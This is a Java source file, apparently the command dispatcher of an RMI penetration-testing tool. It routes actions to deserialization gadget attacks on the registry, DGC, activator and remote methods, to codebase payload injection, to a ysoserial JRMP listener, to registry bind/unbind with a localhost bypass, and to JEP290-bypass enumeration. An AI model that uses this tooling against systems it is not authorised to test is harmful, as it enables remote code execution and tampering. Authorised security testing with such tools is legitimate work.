package de.qtc.rmg.operations;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

import de.qtc.rmg.exceptions.UnexpectedCharacterException;
import de.qtc.rmg.internal.ArgumentParser;
import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Formatter;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.SampleWriter;
import de.qtc.rmg.io.WordlistHandler;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.YsoIntegration;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class Dispatcher {

    private RMIWhisperer rmi;
    private ArgumentParser p;

    private MethodCandidate candidate = null;
    private HashMap<String,String> allClasses = null;
    private ArrayList<HashMap<String,String>> boundClasses = null;

    public Dispatcher(ArgumentParser p)
    {
        this.p = p;
        rmi = new RMIWhisperer(p.getHost(), p.getPort(), (boolean)p.get("ssl"), (boolean)p.get("follow"));

        if(p.containsMethodSignature())
            this.createMethodCandidate();
    }

    @SuppressWarnings("unchecked")
    private void obtainBoundNames()
    {
        rmi.locateRegistry();
        String[] boundNames = rmi.getBoundNames((String)p.get("bound-name"));

        boundClasses = rmi.getClassNames(boundNames);
        allClasses = (HashMap<String, String>)boundClasses.get(0).clone();
        allClasses.putAll(boundClasses.get(1));
    }

    private void createMethodCandidate()
    {
        String signature = (String)p.get("signature");

        try {
            candidate = new MethodCandidate(signature);

        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.invalidSignature(signature);
        }
    }

    private RemoteObjectClient getRemoteObjecClient()
    {
        int objID = (int)p.get("objid");
        String boundName = (String)p.get("bound-name");

        if(candidate == null)
            ExceptionHandler.missingSignature(false);

        if(objID > 0) {
            return new RemoteObjectClient(rmi, objID, candidate, p.getLegacyMode());

        } else if(boundName != null) {

            obtainBoundNames();

            if(!allClasses.containsKey(boundName)) {
                Logger.eprintlnMixedYellow("Specified bound name", boundName, "is not available.");
                RMGUtils.exit();
            }

            return new RemoteObjectClient(rmi, boundName, allClasses.get(boundName), candidate, p.getLegacyMode());

        } else {
            Logger.eprintMixedYellow("Error: method action requires either the", "--bound-name", "or the ");
            Logger.printlnPlainMixedYellowFirst("--objid", "option");
            RMGUtils.exit();
        }

        return null;
    }

    private void writeSamples(HashMap<String,ArrayList<MethodCandidate>> results)
    {
        String templateFolder = (String)p.get("template-folder");
        String sampleFolder = (String)p.get("sample-folder");
        boolean sslValue = (boolean)p.get("ssl");
        boolean followRedirect = (boolean)p.get("followRedirect");
        int legacyMode = (int)p.get("legacyMode");

        Logger.println("");
        Logger.println("Starting creation of sample files:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            String className;
            SampleWriter writer;
            writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect, legacyMode);

            for(String name : results.keySet()) {

                Logger.printlnMixedYellow("Creating samples for bound name", name + ".");
                Logger.increaseIndent();

                className = boundClasses.get(1).get(name);
                writer.createInterface(name, className, (List<MethodCandidate>)results.get(name));
                writer.createSamples(name, className, (List<MethodCandidate>)results.get(name), rmi);

                Logger.decreaseIndent();
            }

        } catch (IOException | CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "sample", "creation", true);

        } catch (UnexpectedCharacterException e) {
            Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
            Logger.eprintln("This is caused by special characters within bound- or classes names.");
            Logger.eprintlnMixedYellow("You can enforce sample cration with the", "--trusted", "switch.");
            RMGUtils.exit();
        }

        Logger.decreaseIndent();
    }

    public void dispatchListen()
    {
        p.checkArgumentCount(4);

        String gadget = p.getPositionalString(3);
        String command = p.getPositionalString(4);
        YsoIntegration.createJRMPListener(p.getHost(), p.getPort(), gadget, command);
    }

    public void dispatchActivator()
    {
        p.checkArgumentCount(4);

        ActivationClient act = new ActivationClient(rmi);
        act.gadgetCall(p.getGadget());
    }

    public void dispatchRegistry()
    {
        p.checkArgumentCount(4);

        String regMethod = p.validateRegMethod();
        boolean localhostBypass = (boolean)p.get("localhost-bypass");

        RegistryClient reg = new RegistryClient(rmi);
        reg.gadgetCall(p.getGadget(), regMethod, localhostBypass);
    }

    public void dispatchDGC()
    {
        p.checkArgumentCount(4);

        String dgcMethod = p.validateDgcMethod();

        DGCClient dgc = new DGCClient(rmi);
        dgc.gadgetCall(dgcMethod, p.getGadget());
    }

    public void dispatchMethod()
    {
        p.checkArgumentCount(4);

        int argumentPosition = (int)p.get("argument-position");

        RemoteObjectClient client = getRemoteObjecClient();
        client.gadgetCall(p.getGadget(), argumentPosition);
    }

    public void dispatchCall()
    {
        p.checkArgumentCount(3);

        Object[] argumentArray = p.getCallArguments();

        RemoteObjectClient client = getRemoteObjecClient();
        client.genericCall(argumentArray);
    }

    public void dispatchCodebase()
    {
        p.checkArgumentCount(4);

        String className = p.getPositionalString(3);
        RMGUtils.setCodebase(p.getPositionalString(4));

        String signature = (String)p.get("signature");
        int argumentPosition = (int)p.get("argument-position");

        Object payload = null;

        try {
            payload = RMGUtils.makeSerializableClass(className);
            payload = ((Class<?>)payload).newInstance();

        } catch (CannotCompileException | InstantiationException | IllegalAccessException e) {
            ExceptionHandler.unexpectedException(e, "payload", "creation", true);
        }

        if( candidate != null ) {
            RemoteObjectClient client = getRemoteObjecClient();
            client.codebaseCall(payload, argumentPosition);

        } else if( signature.matches("dgc") ) {

            DGCClient dgc = new DGCClient(rmi);
            dgc.codebaseCall((String)p.get("dgc-method"), payload);

        } else if( signature.matches("reg") ) {
            RegistryClient reg = new RegistryClient(rmi);
            reg.codebaseCall(payload, (String)p.get("reg-method"), (boolean)p.get("localhost-bypass"));

        } else if( signature.matches("act") ) {
            ActivationClient act = new ActivationClient(rmi);
            act.codebaseCall(payload);

        } else {
            ExceptionHandler.missingSignature(true);
        }
    }

    public void dispatchBind()
    {
        p.checkArgumentCount(4);

        String boundName = p.requireBoundName();

        RegistryClient reg = new RegistryClient(rmi);
        reg.bindObject(boundName, p.getGadget(), (boolean)p.get("localhost-bypass"));
    }

    public void dispatchRebind()
    {
        p.checkArgumentCount(4);

        String boundName = p.requireBoundName();

        RegistryClient reg = new RegistryClient(rmi);
        reg.rebindObject(boundName, p.getGadget(), (boolean)p.get("localhost-bypass"));
    }

    public void dispatchUnbind()
    {
        String boundName = p.requireBoundName();

        RegistryClient reg = new RegistryClient(rmi);
        reg.unbindObject(boundName, (boolean)p.get("localhost-bypass"));
    }

    public void dispatchEnum()
    {
        RMGUtils.enableCodebase();
        obtainBoundNames();

        String regMethod = p.validateRegMethod();
        String dgcMethod = p.validateDgcMethod();
        boolean localhostBypass = (boolean)p.get("localhost-bypass");

        Formatter format = new Formatter();
        format.listBoundNames(boundClasses);

        Logger.println("");
        format.listCodeases();

        Logger.println("");
        RegistryClient registryClient = new RegistryClient(rmi);
        boolean marshal = registryClient.enumerateStringMarshalling();

        Logger.println("");
        registryClient.enumCodebase(marshal, regMethod, localhostBypass);

        Logger.println("");
        registryClient.enumLocalhostBypass();

        Logger.println("");
        DGCClient dgc = new DGCClient(rmi);
        dgc.enumDGC(dgcMethod);

        Logger.println("");
        dgc.enumJEP290(dgcMethod);

        Logger.println("");
        registryClient.enumJEP290Bypass(regMethod, localhostBypass, marshal);

        Logger.println("");
        ActivationClient activationClient = new ActivationClient(rmi);
        activationClient.enumActivator();
    }

    public void dispatchGuess()
    {
        String wordlistFile = (String)p.get("wordlist-file");
        String wordlistFolder = (String)p.get("wordlist-folder");
        boolean updateWordlist = (boolean)p.get("update");
        boolean createSamples = (boolean)p.get("create-samples");

        String boundName = (String)p.get("bound-name");
        int threadCount = (int)p.get("threads");
        boolean zeroArg = (boolean)p.get("zero-arg");
        Formatter format = new Formatter();

        if( !RMGUtils.containsObjects(allClasses) )
            return;

        HashSet<MethodCandidate> candidates = new HashSet<MethodCandidate>();
        if( candidate != null ) {
            candidates.add(candidate);

        } else {

            try {
                WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlist);
                candidates = wlHandler.getWordlistMethods();
            } catch( IOException e ) {
                Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
                ExceptionHandler.stackTrace(e);
                RMGUtils.exit();
            }
        }

        MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
        HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, zeroArg, p.getLegacyMode());
        RMGUtils.addKnownMethods(boundClasses.get(0), results);

        format.listGuessedMethods(results);

        if(createSamples)
            this.writeSamples(results);
    }
}
